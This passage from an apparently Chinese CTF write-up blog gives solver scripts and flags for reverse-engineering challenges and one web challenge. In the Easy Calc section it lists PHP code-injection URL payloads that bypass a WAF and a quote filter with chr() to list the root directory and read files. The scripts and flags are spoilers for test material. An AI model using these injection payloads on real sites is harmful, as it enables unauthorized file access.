<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int8_t</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">len(data)=3</span></span><br><span class="line"><span class="comment">len(r)=4*/</span></span><br><span class="line"><span class="keyword">int8_t</span> base64Tab[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">base64</span><span class="params">(<span class="keyword">uint8_t</span> *data,<span class="keyword">uint8_t</span> *r)</span></span>&#123;</span><br><span class="line">    r[<span class="number">0</span>]=(data[<span class="number">0</span>]&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3f</span>;</span><br><span class="line">    r[<span class="number">1</span>]=((data[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>)&amp;<span class="number">0x30</span>)|((data[<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>);</span><br><span class="line">    r[<span class="number">2</span>]=((data[<span class="number">1</span>]&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0x3c</span>)|((data[<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)&amp;<span class="number">0x3</span>);</span><br><span class="line">    r[<span class="number">3</span>]=(data[<span class="number">2</span>]&amp;<span class="number">0x3f</span>);</span><br><span class="line">    r[<span class="number">0</span>] = base64Tab[r[<span class="number">0</span>]];</span><br><span class="line">    r[<span class="number">1</span>] = base64Tab[r[<span class="number">1</span>]];</span><br><span class="line">    r[<span class="number">2</span>] = base64Tab[r[<span class="number">2</span>]];</span><br><span class="line">    r[<span class="number">3</span>] = base64Tab[r[<span class="number">3</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">cal</span><span class="params">(<span class="keyword">uint64_t</span> x,<span class="keyword">uint8_t</span> y)</span></span>&#123;</span><br><span class="line">    x ^= <span class="number">0xC6A4A7935BD1E995</span>ull * (((<span class="number">0xC6A4A7935BD1E995</span>ull * y) &gt;&gt; <span class="number">47</span>) ^ <span class="number">0xC6A4A7935BD1E995</span>ull * y);</span><br><span class="line">    x *= <span class="number">0xC6A4A7935BD1E995</span>ull;</span><br><span class="line">    x += <span class="number">0xE6546B64</span>ull;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">brute</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tab[]=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;_+/&quot;</span>;</span><br><span class="line">    <span class="keyword">size_t</span> tabLen = <span class="built_in">strlen</span>(tab);</span><br><span class="line">    <span class="keyword">uint8_t</span> flag[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> r[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> x,y;</span><br><span class="line">    <span class="keyword">uint64_t</span> target[<span class="number">8</span>];</span><br><span class="line">    target[<span class="number">0</span>] = <span class="number">0x6C43B2A7</span>ull;</span><br><span class="line">    target[<span class="number">1</span>] = <span class="number">0x7954FD91</span>ull;</span><br><span class="line">    target[<span class="number">2</span>] = <span class="number">0xA3E9532</span>ull;</span><br><span class="line">    target[<span class="number">3</span>] = <span class="number">0xB87B5156</span>ull;</span><br><span class="line">    target[<span class="number">4</span>] = <span class="number">0xDA847742</span>;</span><br><span class="line">    target[<span class="number">5</span>] = <span class="number">0x2395E7F3</span>;</span><br><span class="line">    target[<span class="number">6</span>] = <span class="number">0xA679D954</span>;</span><br><span class="line">    target[<span class="number">7</span>] = <span class="number">0xE1FAAFF7</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i1=<span class="number">0</span>;i1&lt;tabLen;i1++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">size_t</span> i2=<span class="number">0</span>;i2&lt;tabLen;i2++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">size_t</span> i3=<span class="number">0</span>;i3&lt;tabLen;i3++)&#123;</span><br><span class="line">                    flag[<span class="number">0</span>]=tab[i1];</span><br><span class="line">                    flag[<span class="number">1</span>]=tab[i2];</span><br><span class="line">                    flag[<span class="number">2</span>]=tab[i3];</span><br><span class="line">                    base64(flag,r);</span><br><span class="line">                    x=<span class="number">0</span>;</span><br><span class="line">                    x=cal(x,r[<span class="number">0</span>]);</span><br><span class="line">                    x=cal(x,r[<span class="number">1</span>]);</span><br><span class="line">                    x=cal(x,r[<span class="number">2</span>]);</span><br><span class="line">                    x=cal(x,r[<span class="number">3</span>]);</span><br><span class="line">                    x&amp;=<span class="number">0xffffffff</span>ull;</span><br><span class="line">                    <span class="keyword">if</span>(x==target[i])&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    brute();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后要推测，加d}</p>
<h2 id="rev-WMCTF2020-easy-re"><a href="#rev-WMCTF2020-easy-re" class="headerlink" title="[rev][WMCTF2020]easy_re"></a>[rev][WMCTF2020]easy_re</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-317216-1-1.html">https://www.52pojie.cn/thread-317216-1-1.html</a></p>
<p>跟进程序第一步的那个内存，然后单步往下调试，就可以看到反汇编窗口注释处各种字符串，直接复制就是脚本了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eax:&quot;$flag &#x3D; \&quot;WMCTF&#123;&#123;I_WAnt_dynam1c_F1ag&#125;&#125;\&quot;;\r\nprint \&quot;please input the flag:\&quot;;\r\n$line &#x3D; &lt;STDIN&gt;;\r\nchomp($line);\r\nif($line eq $flag)&#123;&#123;\r\n\tprint \&quot;congratulation!\&quot;\r\n&#125;&#125;else&#123;&#123;\r\n\tprint \&quot;no,wrong\&quot;\r\n&#125;&#125;&quot;</span><br></pre></td></tr></table></figure></p>
<h2 id="web-RoarCTF-2019-Easy-Calc"><a href="#web-RoarCTF-2019-Easy-Calc" class="headerlink" title="[web][RoarCTF 2019]Easy Calc"></a>[web][RoarCTF 2019]Easy Calc</h2><p>原来可以访问calc源码啊</p>
<ol>
<li>如果WAF中有个规则是num不是表达式就拦截，WAF解析链接的时候会把空格和某些字符转为下划线，所以WAF看到的%20num参数会解析成_num，但是PHP解析时候会将空格去掉，这样就绕过WAF了</li>
<li>黑名单中有单引号和双引号过滤，所以要用chr()代替字符</li>
</ol>
<p>calc.php?%20num=phpinfo()</p>
<p>calc.php?%20num=var_dump(scandir(chr(47))) // 扫描根目录</p>
<p>有个f1agg</p>
<p>calc.php?%20num=show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) // 获取文件内容，使用file_get_contents也行</p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/borber/p/Easy_Calc_1.html">https://www.cnblogs.com/borber/p/Easy_Calc_1.html</a></p>
<h2 id="rev-FlareOn5-FLEGGO"><a href="#rev-FlareOn5-FLEGGO" class="headerlink" title="[rev][FlareOn5]FLEGGO"></a>[rev][FlareOn5]FLEGGO</h2><p>一大帮exe文件</p>
<p>1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe</p>
<p>ZImIT7DyCMOeF6 651174.png =&gt; w</p>
<p>这个输出很奇怪</p>
<p>使用ResourceHacker发现所有的文件，密码都在指定的偏移处，可以直接执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">fs = os.listdir(<span class="string">&quot;fleggo&quot;</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> fs:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.exe&quot;</span> <span class="keyword">in</span> f:</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&quot;\&quot;%s\&quot;,&quot;</span>%f,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;\n%d&quot;</span>%i)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> fnames[][<span class="number">256</span>]=&#123;<span class="string">&quot;1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe&quot;</span>,<span class="string">&quot;1JpPaUMynR9GflWbxfYvZviqiCB59RcI.exe&quot;</span>,<span class="string">&quot;2AljFfLleprkThTHuVvg63I7OgjG2LQT.exe&quot;</span>,<span class="string">&quot;3Jh0ELkck1MuRvzr8PLIpBNUGlspmGnu.exe&quot;</span>,<span class="string">&quot;4ihY3RWK4WYqI4XOXLtAH6XV5lkoIdgv.exe&quot;</span>,<span class="string">&quot;7mCysSKfiHJ4WqH2T8ERLE33Wrbp6Mqe.exe&quot;</span>,<span class="string">&quot;AEVYfSTJwubrlJKgxV8RAl0AdZJ5vhhy.exe&quot;</span>,<span class="string">&quot;aSfSVMn7B8eRtxgJgwPP5Y5HiDEidvKg.exe&quot;</span>,<span class="string">&quot;azcyERV8HUbXmqPTEq5JFt7Ax1W5K4wl.exe&quot;</span>,<span class="string">&quot;BG3IDbHOUt9yHumPceLTVbObBHFneYEu.exe&quot;</span>,<span class="string">&quot;Bl0Iv5lT6wkpVCuy7jtcva7qka8WtLYY.exe&quot;</span>,<span class="string">&quot;bmYBZTBJlaFNbbwpiOiiQVdzimx8QVTI.exe&quot;</span>,<span class="string">&quot;Bp7836noYu71VAWc27sUdfaGwieALfc2.exe&quot;</span>,<span class="string">&quot;cWvFLbliUfJl7KFDUYF1ABBFYFb6FJMz.exe&quot;</span>,<span class="string">&quot;d4NlRo5umkvWhZ2FmEG32rXBNeSSLt2Q.exe&quot;</span>,<span class="string">&quot;dnAciAGVdlovQFSJmNiPOdHjkM3Ji18o.exe&quot;</span>,<span class="string">&quot;dT4Xze8paLOG7srCdGLsbLE1s6m3EsfX.exe&quot;</span>,<span class="string">&quot;E36RGTbCE4LDtyLi97l9lSFoR7xVMKGN.exe&quot;</span>,<span class="string">&quot;eEJhUoNbuc40kLHRo8GB7bwFPkuhgaVN.exe&quot;</span>,<span class="string">&quot;eovBHrlDb809jf08yaAcSzcX4T37F1NI.exe&quot;</span>,<span class="string">&quot;Ew93SSPDbgiQYo4E4035A16MJUxXegDW.exe&quot;</span>,<span class="string">&quot;gFZw7lPUlbOXBvHRc31HJI5PKwy745Wv.exe&quot;</span>,<span class="string">&quot;hajfdokqjogmoWfpyp4w0feoeyhs1QLo.exe&quot;</span>,<span class="string">&quot;HDHugJBqTJqKKVtqi3sfR4BTq6P5XLZY.exe&quot;</span>,<span class="string">&quot;iJO15JsCa1bV5anXnZ9dTC9iWbEDmdtf.exe&quot;</span>,<span class="string">&quot;IXITujCLucnD4P3YrXOud5gC7Bwcw6mr.exe&quot;</span>,<span class="string">&quot;JIdE7SESzC1aS58Wwe5j3i6XbpkCa3S6.exe&quot;</span>,<span class="string">&quot;jJHgJjbyeWTTyQqISuJMpEGgE1aFs5ZB.exe&quot;</span>,<span class="string">&quot;JXADoHafRHDyHmcTUjEBOvqq95spU7sj.exe&quot;</span>,<span class="string">&quot;K7HjR3Hf10SGG7rgke9WrRfxqhaGixS0.exe&quot;</span>,<span class="string">&quot;kGQY35HJ7gvXzDJLWe8mabs3oKpwCo6L.exe&quot;</span>,<span class="string">&quot;lk0SOpnVIzTcC1Dcou9R7prKAC3laX0k.exe&quot;</span>,<span class="string">&quot;MrA1JmEDfPhnTi5MNMhqVS8aaTKdxbMe.exe&quot;</span>,<span class="string">&quot;NaobGsJ2w6qqblcIsj4QYNIBQhg3gmTR.exe&quot;</span>,<span class="string">&quot;P2PxxSJpnquBQ3xCvLoYj4pD3iyQcaKj.exe&quot;</span>,<span class="string">&quot;PvlqINbYjAY1E4WFfc2N6rZ2nKVhNZTP.exe&quot;</span>,<span class="string">&quot;SDIADRKhATsagJ3K8WwaNcQ52708TyRo.exe&quot;</span>,<span class="string">&quot;SeDdxvPJFHCr7uoQMjwmdRBAYEelHBZB.exe&quot;</span>,<span class="string">&quot;u3PL12jk5jCZKiVm0omvh46yK7NDfZLT.exe&quot;</span>,<span class="string">&quot;u8mbI3GZ8WtwruEiFkIl0UKxJS917407.exe&quot;</span>,<span class="string">&quot;v6RkHsLya4wTAh71C65hMXBsTc1ZhGZT.exe&quot;</span>,<span class="string">&quot;w3Y5YeglxqIWstp1PLbFoHvrQ9rN3F3x.exe&quot;</span>,<span class="string">&quot;wmkeAU8MdYrC9tEUMHH2tRMgaGdiFnga.exe&quot;</span>,<span class="string">&quot;x4neMBrqkYIQxDuXpwJNQZOlfyfA0eXs.exe&quot;</span>,<span class="string">&quot;xatgydl5cadiWFY4EXMRuoQr22ZIRC1Y.exe&quot;</span>,<span class="string">&quot;xyjJcvGAgswB7Yno5e9qLF4i13L1iGoT.exe&quot;</span>,<span class="string">&quot;y77GmQGdwVL7Fc9mMdiLJMgFQ8rgeSrl.exe&quot;</span>,<span class="string">&quot;zRx3bsMfOwG8IaayOeS8rHSSpiRfc9IB.exe&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> prefix[]=<span class="string">&quot;fleggo/&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> nLen=<span class="number">48</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">brute</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> _i=<span class="number">0</span>;_i&lt;nLen;_i++)&#123;</span><br><span class="line">        <span class="keyword">char</span> fullname[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">char</span> password[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">sprintf</span>(fullname,<span class="string">&quot;%s%s&quot;</span>,prefix,fnames[_i]);</span><br><span class="line">        FILE *f = fopen(fullname,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        fseek(f,<span class="number">0x2ab0</span>,SEEK_SET);</span><br><span class="line">        fread(password,<span class="number">32</span>,<span class="number">1</span>,f);</span><br><span class="line">        fclose(f);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">            password[i]=password[i*<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s==&gt;%s\n&quot;</span>,fnames[_i],password);</span><br><span class="line">        FILE *pf = popen(fullname,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(pf,<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">        pclose(pf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    brute();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后手动排序</p>
<h2 id="DASCTF-安恒7月赛-alphabeta"><a href="#DASCTF-安恒7月赛-alphabeta" class="headerlink" title="[DASCTF]安恒7月赛 alphabeta"></a>[DASCTF]安恒7月赛 alphabeta</h2><p>这道题竟然可以用z3，我还以为直接穷举，学到了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 奇数位要么等于0x54要么等于0x52</span></span><br><span class="line"><span class="comment"># 偶数位0x4e 0x59</span></span><br><span class="line"></span><br><span class="line">a=[<span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x1a</span>, <span class="number">0x14</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x10</span>, <span class="number">0xc</span>, <span class="number">0xc</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x13</span>, <span class="number">0xa</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0x11</span>, <span class="number">0x19</span>, <span class="number">0x18</span>, <span class="number">0x16</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0x5</span>, <span class="number">0x12</span>, <span class="number">0x18</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x14</span>, <span class="number">0x64</span>,]</span><br><span class="line"></span><br><span class="line">b=[<span class="number">0x8</span>, <span class="number">0x16</span>, <span class="number">0x1a</span>, <span class="number">0x1c</span>, <span class="number">0x18</span>, <span class="number">0x1c</span>, <span class="number">0xb</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x1b</span>, <span class="number">0x1b</span>, <span class="number">0x18</span>, <span class="number">0x1c</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x9</span>, <span class="number">0xf</span>, <span class="number">0x18</span>, <span class="number">0x1a</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x1a</span>, <span class="number">0x19</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x19</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x13</span>, <span class="number">0x1a</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x18</span>, <span class="number">0x1d</span>, <span class="number">0xc8</span>,]</span><br><span class="line"></span><br><span class="line">c=[<span class="number">0xd</span>, <span class="number">0x19</span>, <span class="number">0xd</span>, <span class="number">0x2e</span>, <span class="number">0xc</span>, <span class="number">0x2b</span>, <span class="number">0x2a</span>, <span class="number">0x4</span>, <span class="number">0x16</span>, <span class="number">0x2e</span>, <span class="number">0x16</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0xc</span>, <span class="number">0x18</span>, <span class="number">0xc</span>, <span class="number">0x30</span>, <span class="number">0x8</span>, <span class="number">0x18</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0x7</span>, <span class="number">0xf</span>, <span class="number">0x6</span>, <span class="number">0x15</span>, <span class="number">0x2</span>, <span class="number">0x1e</span>, <span class="number">0x13</span>, <span class="number">0xa</span>, <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x5</span>, <span class="number">0x16</span>, <span class="number">0x13</span>, <span class="number">0x28</span>, <span class="number">0x69636544</span>, <span class="number">0x6e6f6973</span>, <span class="number">0x6572745f</span>, <span class="number">0x72705f65</span>, <span class="number">0x696e6e75</span>, <span class="number">0x676e</span>, <span class="number">0x0</span>,]</span><br><span class="line">d = []</span><br><span class="line">target=<span class="number">0xd66</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    d.append(c[i]*(b[i]-a[i]))</span><br><span class="line">s = Solver()</span><br><span class="line">v = [BitVec(<span class="string">&#x27;v%d&#x27;</span>%i,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>)]</span><br><span class="line">vv = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>)]</span><br><span class="line">summ = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    summ+=v[i]*d[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    s.add(v[i]&gt;=<span class="number">0</span>)</span><br><span class="line">    s.add(v[i]&lt;<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(a[i],b[i]):</span><br><span class="line">        vv[j]+=c[i]*v[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    s.add(vv[i]&lt;<span class="number">150</span>)</span><br><span class="line"></span><br><span class="line">s.add(summ==target)</span><br><span class="line">res = []</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        res.append(m[i].as_long())</span><br><span class="line">        <span class="keyword">if</span> m[i].as_long()==<span class="number">1</span>:</span><br><span class="line">            flag.append(<span class="number">0x59</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="number">0x4e</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">if</span> (i&amp;<span class="number">1</span>)==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> flag[i]==<span class="number">0x4e</span>:</span><br><span class="line">            flag[i]=<span class="number">0x52</span></span><br><span class="line">        <span class="keyword">else</span>: flag[i]=<span class="number">0x54</span></span><br><span class="line">print(bytes(flag))</span><br></pre></td></tr></table></figure>
<h2 id="dasctf-hide-and-seek"><a href="#dasctf-hide-and-seek" class="headerlink" title="[dasctf]hide_and_seek"></a>[dasctf]hide_and_seek</h2><ol>
<li>入口不是真入口，通过调试找到了真正的入口</li>
